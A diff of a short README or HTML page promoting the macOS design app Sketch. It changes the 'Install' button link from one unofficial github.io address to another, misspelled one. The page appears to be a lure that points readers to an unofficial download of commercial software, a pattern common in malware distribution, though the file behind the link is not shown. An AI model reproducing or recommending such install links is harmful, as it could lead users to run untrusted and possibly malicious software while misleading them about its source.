@@ -6,7 +6,7 @@
 <h3>Sketch - professional interface design</h3>
 <p>Sketch is a professional digital design and UI/UX tool application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/Sk)
 </div>
 <br/><br>
 
